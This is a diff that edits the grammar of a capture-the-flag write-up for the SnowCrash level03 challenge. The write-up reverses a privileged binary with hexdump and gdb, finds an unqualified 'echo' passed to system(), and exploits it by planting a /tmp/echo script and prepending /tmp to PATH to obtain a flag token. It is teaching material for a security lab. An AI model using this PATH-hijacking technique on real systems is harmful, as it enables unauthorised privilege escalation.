@@ -2,7 +2,7 @@
 
 ---
 
-For this level we have in the `level03` repository a file named `level03`. This file is a ELF file. The first thing I do is `cat` this file to have so useful informations.
+For this level, we have in the `level03` repository a file named `level03`. This file is an ELF file. The first thing I do is `cat` this file to have some useful information.
 
 ```shell
 $ hexdump -C level03
@@ -18,14 +18,14 @@ $ hexdump -C level03
 [...]
 ```
 
-We hame few more informations now :
-1. This file calls echo to print "Exploit Me".
+We have a few more pieces of information now:
+1. This file calls `echo` to print "Exploit Me."
 2. This file has been compiled by GCC.
-3. The source file was `/home/user/level03/level03.c`
+3. The source file was `/home/user/level03/level03.c`.
 
-Sadly our user doesn't have access to the source file.
+Sadly, our user doesn't have access to the source file.
 
-I need to have for information about what `leve03` does for that I will use `gdb` which is a debugger and reverse engineering tool.
+I need more information about what `level03` does. For that, I will use `gdb`, which is a debugger and reverse engineering tool.
 
 ```shell
 $ gdb -q level03
@@ -62,20 +62,20 @@ Dump of assembler code for function main:
 0x80485e0:	 "/usr/bin/env echo Exploit me"
 ```
 
-Now I know that the program must have a line like this: `system("/usr/bin/env echo Exploit me")`
+Now I know that the program must have a line like this: `system("/usr/bin/env echo Exploit me")`.
 
 One more detail I found is that `level03` has `flag03` rights. So I need to change the line above to run the `getflag` command.
 
-This command has a vulnerability because echo isn't called with a absolute path, so we can easily run the command we want with symlink and a PATH variable changed.
+This command has a vulnerability because `echo` isn't called with an absolute path, so we can easily run the command we want with a symlink and a PATH variable changed.
 
-First I search the getflag executable path.
+First, I search for the `getflag` executable path.
 ```shell
 $ level03@SnowCrash:/tmp$ find / -name "*getflag*" 2>/dev/null
 /bin/getflag
 /rofs/bin/getflag
 ```
 
-Then I create a file to execute getflag and give full rights to the file.
+Then I create a file to execute `getflag` and give full permissions to the file.
 ```shell
 $ vim /tmp/echo
 #!/bin/bash
@@ -83,10 +83,10 @@ $ vim /tmp/echo
 $ chmod 777 /tmp/echo
 ```
 
-And finally I change the PATH by adding the tmp path at the beginning and I run the command.
+And finally, I change the PATH by adding the `/tmp` path at the beginning, and I run the command.
 ```shell
 $ export PATH="/tmp:$PATH"
 $ ./level03
-Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+Check flag. Here is your token: qi0maab88jeaj46qoumi7maus
 ```
 
